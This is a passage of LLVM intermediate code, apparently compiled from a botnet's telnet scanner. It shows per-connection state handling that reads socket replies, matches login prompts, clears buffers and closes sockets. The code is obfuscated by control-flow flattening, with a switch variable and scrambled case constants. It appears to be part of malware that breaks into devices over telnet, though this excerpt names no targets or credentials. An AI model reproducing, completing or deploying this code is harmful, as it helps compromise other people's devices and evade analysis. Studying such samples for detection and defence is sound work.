  %1344 = call i32 @sclose(i32 %1343)
  %1345 = load i32, i32* %2, align 4
  %1346 = sext i32 %1345 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %1346
  %1348 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1347, i32 0, i32 2
  store i8 0, i8* %1348, align 8
  %1349 = load i32, i32* %2, align 4
  %1350 = sext i32 %1349 to i64
  %.reload135 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1351 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload135, i64 %1350
  %1352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1351, i32 0, i32 3
  store i8 1, i8* %1352, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1353:                                   ; preds = %loopEntry
  %1354 = load i32, i32* %2, align 4
  %1355 = sext i32 %1354 to i64
  %.reload134 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1356 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload134, i64 %1355
  %1357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1356, i32 0, i32 2
  store i8 7, i8* %1357, align 8
  store i32 158166852, i32* %switchVar
  br label %loopEnd

; <label>:1358:                                   ; preds = %loopEntry
  %1359 = load i32, i32* %2, align 4
  %1360 = sext i32 %1359 to i64
  %.reload133 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload133, i64 %1360
  %1362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1361, i32 0, i32 8
  %1363 = load i8*, i8** %1362, align 8
  call void @llvm.memset.p0i8.i64(i8* %1363, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1364:                                   ; preds = %loopEntry
  %1365 = load i32, i32* %2, align 4
  %1366 = sext i32 %1365 to i64
  %.reload132 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload132, i64 %1366
  %1368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1367, i32 0, i32 0
  %1369 = load i32, i32* %1368, align 16
  %1370 = load i32, i32* %2, align 4
  %1371 = sext i32 %1370 to i64
  %.reload131 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload131, i64 %1371
  %1373 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1372, i32 0, i32 8
  %1374 = load i8*, i8** %1373, align 8
  %1375 = load i32, i32* %2, align 4
  %1376 = sext i32 %1375 to i64
  %.reload130 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload130, i64 %1376
  %1378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1377, i32 0, i32 7
  %1379 = load i16, i16* %1378, align 16
  %1380 = zext i16 %1379 to i32
  %1381 = call i32 @readUntil(i32 %1369, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1374, i32 1024, i32 %1380)
  %1382 = icmp ne i32 %1381, 0
  %1383 = select i1 %1382, i32 606455283, i32 901050119
  store i32 %1383, i32* %switchVar
  br label %loopEnd

; <label>:1384:                                   ; preds = %loopEntry
  %1385 = load i32, i32* %2, align 4
  %1386 = sext i32 %1385 to i64
  %.reload129 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload129, i64 %1386
  %1388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1387, i32 0, i32 6
  store i32 0, i32* %1388, align 4
  %1389 = load i32, i32* %2, align 4
  %1390 = sext i32 %1389 to i64
  %.reload128 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload128, i64 %1390
  %1392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1391, i32 0, i32 7
  store i16 0, i16* %1392, align 16
  %1393 = load i32, i32* %2, align 4
  %1394 = sext i32 %1393 to i64
  %.reload127 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1395 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload127, i64 %1394
  %1396 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1395, i32 0, i32 8
  %1397 = load i8*, i8** %1396, align 8
  %1398 = call i8* @strstr(i8* %1397, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %1399 = icmp ne i8* %1398, null
  %1400 = select i1 %1399, i32 1730533267, i32 1697972445
  store i32 %1400, i32* %switchVar
  br label %loopEnd

; <label>:1401:                                   ; preds = %loopEntry
  %1402 = load i32, i32* %2, align 4
  %1403 = sext i32 %1402 to i64
  %.reload126 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1404 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload126, i64 %1403
  %1405 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1404, i32 0, i32 8
  %1406 = load i8*, i8** %1405, align 8
  call void @llvm.memset.p0i8.i64(i8* %1406, i8 0, i64 1024, i32 1, i1 false)
  %1407 = load i32, i32* %2, align 4
  %1408 = sext i32 %1407 to i64
  %.reload125 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload125, i64 %1408
  %1410 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1409, i32 0, i32 0
  %1411 = load i32, i32* %1410, align 16
  %1412 = call i32 @sclose(i32 %1411)
  %1413 = load i32, i32* %2, align 4
  %1414 = sext i32 %1413 to i64
  %.reload124 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1415 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload124, i64 %1414
  %1416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1415, i32 0, i32 2
  store i8 0, i8* %1416, align 8
  %1417 = load i32, i32* %2, align 4
  %1418 = sext i32 %1417 to i64
  %.reload123 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1419 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload123, i64 %1418
  %1420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1419, i32 0, i32 3
  store i8 0, i8* %1420, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1421:                                   ; preds = %loopEntry
  %1422 = load i32, i32* %2, align 4
  %1423 = sext i32 %1422 to i64
  %.reload122 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1424 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload122, i64 %1423
  %1425 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1424, i32 0, i32 8
  %1426 = load i8*, i8** %1425, align 8
  %1427 = call i32 @matchPrompt(i8* %1426)
  %1428 = icmp ne i32 %1427, 0
  %1429 = select i1 %1428, i32 -783095586, i32 -560378493
  store i32 %1429, i32* %switchVar
  br label %loopEnd

; <label>:1430:                                   ; preds = %loopEntry
  %1431 = load i32, i32* %2, align 4
  %1432 = sext i32 %1431 to i64
  %.reload121 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1433 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload121, i64 %1432
  %1434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1433, i32 0, i32 8
  %1435 = load i8*, i8** %1434, align 8
  call void @llvm.memset.p0i8.i64(i8* %1435, i8 0, i64 1024, i32 1, i1 false)
  %1436 = load i32, i32* %2, align 4
  %1437 = sext i32 %1436 to i64
  %.reload120 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload120, i64 %1437
  %1439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1438, i32 0, i32 0
  %1440 = load i32, i32* %1439, align 16
  %1441 = call i32 @sclose(i32 %1440)
  %1442 = load i32, i32* %2, align 4
  %1443 = sext i32 %1442 to i64
  %.reload119 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1444 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload119, i64 %1443
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1444, i32 0, i32 2
  store i8 0, i8* %1445, align 8
  %1446 = load i32, i32* %2, align 4
  %1447 = sext i32 %1446 to i64
  %.reload118 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload118, i64 %1447
  %1449 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1448, i32 0, i32 3
  store i8 1, i8* %1449, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1450:                                   ; preds = %loopEntry
  %1451 = load i32, i32* %2, align 4
  %1452 = sext i32 %1451 to i64
  %.reload117 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1453 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload117, i64 %1452
  %1454 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1453, i32 0, i32 2
  store i8 7, i8* %1454, align 8
  store i32 -513957958, i32* %switchVar
  br label %loopEnd

; <label>:1455:                                   ; preds = %loopEntry
  %1456 = load i32, i32* %2, align 4
  %1457 = sext i32 %1456 to i64
  %.reload116 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1458 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload116, i64 %1457
  %1459 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1458, i32 0, i32 8
  %1460 = load i8*, i8** %1459, align 8
  call void @llvm.memset.p0i8.i64(i8* %1460, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1461:                                   ; preds = %loopEntry
  %1462 = load i32, i32* %2, align 4
  %1463 = sext i32 %1462 to i64
  %.reload115 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1464 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload115, i64 %1463
  %1465 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1464, i32 0, i32 0
  %1466 = load i32, i32* %1465, align 16
  %1467 = load i32, i32* %2, align 4
  %1468 = sext i32 %1467 to i64
  %.reload114 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1469 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload114, i64 %1468
  %1470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1469, i32 0, i32 8
  %1471 = load i8*, i8** %1470, align 8
  %1472 = load i32, i32* %2, align 4
  %1473 = sext i32 %1472 to i64
  %.reload113 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1474 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload113, i64 %1473
  %1475 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1474, i32 0, i32 7
  %1476 = load i16, i16* %1475, align 16
  %1477 = zext i16 %1476 to i32
  %1478 = call i32 @readUntil(i32 %1466, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1471, i32 1024, i32 %1477)
  %1479 = icmp ne i32 %1478, 0
  %1480 = select i1 %1479, i32 460755482, i32 -1151250819
  store i32 %1480, i32* %switchVar
  br label %loopEnd

; <label>:1481:                                   ; preds = %loopEntry
  %1482 = load i32, i32* %2, align 4
  %1483 = sext i32 %1482 to i64
  %.reload112 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1484 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload112, i64 %1483
  %1485 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1484, i32 0, i32 6
  store i32 0, i32* %1485, align 4
  %1486 = load i32, i32* %2, align 4
  %1487 = sext i32 %1486 to i64
  %.reload111 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload111, i64 %1487
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1488, i32 0, i32 7
  store i16 0, i16* %1489, align 16
  %1490 = load i32, i32* %2, align 4
  %1491 = sext i32 %1490 to i64
  %.reload110 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload110, i64 %1491
  %1493 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1492, i32 0, i32 8
  %1494 = load i8*, i8** %1493, align 8
  %1495 = call i8* @strstr(i8* %1494, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %1496 = icmp ne i8* %1495, null
  %1497 = select i1 %1496, i32 242708611, i32 137154506
  store i32 %1497, i32* %switchVar
  br label %loopEnd

; <label>:1498:                                   ; preds = %loopEntry
  %1499 = load i32, i32* %2, align 4
  %1500 = sext i32 %1499 to i64
  %.reload109 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1501 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload109, i64 %1500
  %1502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1501, i32 0, i32 8
  %1503 = load i8*, i8** %1502, align 8
  call void @llvm.memset.p0i8.i64(i8* %1503, i8 0, i64 1024, i32 1, i1 false)
  %1504 = load i32, i32* %2, align 4
  %1505 = sext i32 %1504 to i64
  %.reload108 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1506 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload108, i64 %1505
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1506, i32 0, i32 0
  %1508 = load i32, i32* %1507, align 16
  %1509 = call i32 @sclose(i32 %1508)
  %1510 = load i32, i32* %2, align 4
  %1511 = sext i32 %1510 to i64
  %.reload107 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload107, i64 %1511
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1512, i32 0, i32 2
  store i8 0, i8* %1513, align 8
  %1514 = load i32, i32* %2, align 4
  %1515 = sext i32 %1514 to i64
  %.reload106 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload106, i64 %1515
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1516, i32 0, i32 3
  store i8 0, i8* %1517, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1518:                                   ; preds = %loopEntry
  %1519 = load i32, i32* %2, align 4
  %1520 = sext i32 %1519 to i64
  %.reload105 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1521 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload105, i64 %1520
  %1522 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1521, i32 0, i32 8
  %1523 = load i8*, i8** %1522, align 8
  %1524 = call i32 @matchPrompt(i8* %1523)
  %1525 = icmp ne i32 %1524, 0
  %1526 = select i1 %1525, i32 596128024, i32 -737042517
  store i32 %1526, i32* %switchVar
  br label %loopEnd

; <label>:1527:                                   ; preds = %loopEntry
  %1528 = load i32, i32* %2, align 4
  %1529 = sext i32 %1528 to i64
  %.reload104 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload104, i64 %1529
  %1531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1530, i32 0, i32 8
  %1532 = load i8*, i8** %1531, align 8
  call void @llvm.memset.p0i8.i64(i8* %1532, i8 0, i64 1024, i32 1, i1 false)
  %1533 = load i32, i32* %2, align 4
  %1534 = sext i32 %1533 to i64
  %.reload103 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload103, i64 %1534
  %1536 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1535, i32 0, i32 0
  %1537 = load i32, i32* %1536, align 16
  %1538 = call i32 @sclose(i32 %1537)
  %1539 = load i32, i32* %2, align 4
  %1540 = sext i32 %1539 to i64
  %.reload102 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1541 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload102, i64 %1540
  %1542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1541, i32 0, i32 2
  store i8 0, i8* %1542, align 8
  %1543 = load i32, i32* %2, align 4
  %1544 = sext i32 %1543 to i64
  %.reload101 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1545 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload101, i64 %1544
  %1546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1545, i32 0, i32 3
  store i8 1, i8* %1546, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1547:                                   ; preds = %loopEntry
  %1548 = load i32, i32* %2, align 4
  %1549 = sext i32 %1548 to i64
  %.reload100 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload100, i64 %1549
  %1551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1550, i32 0, i32 2
  store i8 7, i8* %1551, align 8
  store i32 -241251140, i32* %switchVar
  br label %loopEnd

; <label>:1552:                                   ; preds = %loopEntry
  %1553 = load i32, i32* %2, align 4
  %1554 = sext i32 %1553 to i64
  %.reload99 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload99, i64 %1554
  %1556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1555, i32 0, i32 8
  %1557 = load i8*, i8** %1556, align 8
  call void @llvm.memset.p0i8.i64(i8* %1557, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1558:                                   ; preds = %loopEntry
  %1559 = load i32, i32* %2, align 4
  %1560 = sext i32 %1559 to i64
  %.reload98 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1561 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload98, i64 %1560
  %1562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1561, i32 0, i32 0
  %1563 = load i32, i32* %1562, align 16
  %1564 = load i32, i32* %2, align 4
  %1565 = sext i32 %1564 to i64
  %.reload97 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload97, i64 %1565
  %1567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1566, i32 0, i32 8
  %1568 = load i8*, i8** %1567, align 8
  %1569 = load i32, i32* %2, align 4
  %1570 = sext i32 %1569 to i64
  %.reload96 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload96, i64 %1570
  %1572 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1571, i32 0, i32 7
  %1573 = load i16, i16* %1572, align 16
  %1574 = zext i16 %1573 to i32
  %1575 = call i32 @readUntil(i32 %1563, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1568, i32 1024, i32 %1574)
  %1576 = icmp ne i32 %1575, 0
  %1577 = select i1 %1576, i32 830497771, i32 424222326
  store i32 %1577, i32* %switchVar
  br label %loopEnd

; <label>:1578:                                   ; preds = %loopEntry
  %1579 = load i32, i32* %2, align 4
  %1580 = sext i32 %1579 to i64
  %.reload95 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1581 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload95, i64 %1580
  %1582 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1581, i32 0, i32 6
  store i32 0, i32* %1582, align 4
  %1583 = load i32, i32* %2, align 4
  %1584 = sext i32 %1583 to i64
  %.reload94 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1585 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload94, i64 %1584
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1585, i32 0, i32 7
  store i16 0, i16* %1586, align 16
  %1587 = load i32, i32* %2, align 4
  %1588 = sext i32 %1587 to i64
  %.reload93 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1589 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload93, i64 %1588
  %1590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1589, i32 0, i32 8
  %1591 = load i8*, i8** %1590, align 8
  %1592 = call i8* @strstr(i8* %1591, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %1593 = icmp ne i8* %1592, null
  %1594 = select i1 %1593, i32 2058773733, i32 1342302764
  store i32 %1594, i32* %switchVar
  br label %loopEnd

; <label>:1595:                                   ; preds = %loopEntry
  %1596 = load i32, i32* %2, align 4
  %1597 = sext i32 %1596 to i64
  %.reload92 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload92, i64 %1597
  %1599 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1598, i32 0, i32 8
  %1600 = load i8*, i8** %1599, align 8
  call void @llvm.memset.p0i8.i64(i8* %1600, i8 0, i64 1024, i32 1, i1 false)
  %1601 = load i32, i32* %2, align 4
  %1602 = sext i32 %1601 to i64
  %.reload91 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload91, i64 %1602
  %1604 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1603, i32 0, i32 0
  %1605 = load i32, i32* %1604, align 16
  %1606 = call i32 @sclose(i32 %1605)
  %1607 = load i32, i32* %2, align 4
  %1608 = sext i32 %1607 to i64
  %.reload90 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1609 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload90, i64 %1608
  %1610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1609, i32 0, i32 2
  store i8 0, i8* %1610, align 8
  %1611 = load i32, i32* %2, align 4
  %1612 = sext i32 %1611 to i64
  %.reload89 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1613 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload89, i64 %1612
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1613, i32 0, i32 3
  store i8 0, i8* %1614, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1615:                                   ; preds = %loopEntry
  %1616 = load i32, i32* %2, align 4
  %1617 = sext i32 %1616 to i64
  %.reload88 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload88, i64 %1617
  %1619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1618, i32 0, i32 8
  %1620 = load i8*, i8** %1619, align 8
  %1621 = call i32 @matchPrompt(i8* %1620)
  %1622 = icmp ne i32 %1621, 0
  %1623 = select i1 %1622, i32 1488096617, i32 -637914168
  store i32 %1623, i32* %switchVar
  br label %loopEnd

; <label>:1624:                                   ; preds = %loopEntry
  %1625 = load i32, i32* %2, align 4
  %1626 = sext i32 %1625 to i64
  %.reload87 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload87, i64 %1626
  %1628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1627, i32 0, i32 8
  %1629 = load i8*, i8** %1628, align 8
  call void @llvm.memset.p0i8.i64(i8* %1629, i8 0, i64 1024, i32 1, i1 false)
  %1630 = load i32, i32* %2, align 4
  %1631 = sext i32 %1630 to i64
  %.reload86 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload86, i64 %1631
  %1633 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1632, i32 0, i32 0
  %1634 = load i32, i32* %1633, align 16
  %1635 = call i32 @sclose(i32 %1634)
  %1636 = load i32, i32* %2, align 4
  %1637 = sext i32 %1636 to i64
  %.reload85 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload85, i64 %1637
  %1639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1638, i32 0, i32 2
  store i8 0, i8* %1639, align 8
  %1640 = load i32, i32* %2, align 4
  %1641 = sext i32 %1640 to i64
  %.reload84 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1642 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload84, i64 %1641
  %1643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1642, i32 0, i32 3
  store i8 1, i8* %1643, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1644:                                   ; preds = %loopEntry
  %1645 = load i32, i32* %2, align 4
  %1646 = sext i32 %1645 to i64
  %.reload83 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1647 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload83, i64 %1646
  %1648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1647, i32 0, i32 2
  store i8 7, i8* %1648, align 8
  store i32 -927949567, i32* %switchVar
  br label %loopEnd

; <label>:1649:                                   ; preds = %loopEntry
  %1650 = load i32, i32* %2, align 4
  %1651 = sext i32 %1650 to i64
  %.reload82 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1652 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload82, i64 %1651
  %1653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1652, i32 0, i32 8
  %1654 = load i8*, i8** %1653, align 8
  call void @llvm.memset.p0i8.i64(i8* %1654, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:1655:                                   ; preds = %loopEntry
  %1656 = load i32, i32* %2, align 4
  %1657 = sext i32 %1656 to i64
  %.reload81 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload81, i64 %1657
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1658, i32 0, i32 0
  %1660 = load i32, i32* %1659, align 16
  %1661 = load i32, i32* %2, align 4
  %1662 = sext i32 %1661 to i64
  %.reload80 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1663 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload80, i64 %1662
  %1664 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1663, i32 0, i32 8
  %1665 = load i8*, i8** %1664, align 8
  %1666 = load i32, i32* %2, align 4
  %1667 = sext i32 %1666 to i64
  %.reload79 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload79, i64 %1667
  %1669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1668, i32 0, i32 7
  %1670 = load i16, i16* %1669, align 16
  %1671 = zext i16 %1670 to i32
  %1672 = call i32 @readUntil(i32 %1660, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1665, i32 1024, i32 %1671)
  %1673 = icmp ne i32 %1672, 0
  %1674 = select i1 %1673, i32 -1106466684, i32 -1153680536
  store i32 %1674, i32* %switchVar
  br label %loopEnd

; <label>:1675:                                   ; preds = %loopEntry
  %1676 = load i32, i32* %2, align 4
  %1677 = sext i32 %1676 to i64
  %.reload78 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %1678 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload78, i64 %1677
  %1679 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1678, i32 0, i32 6
  store i32 0, i32* %1679, align 4
  %1680 = load i32, i32* %2, align 4
  %1681 = sext i32 %1680 to i64
  %.reload77 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
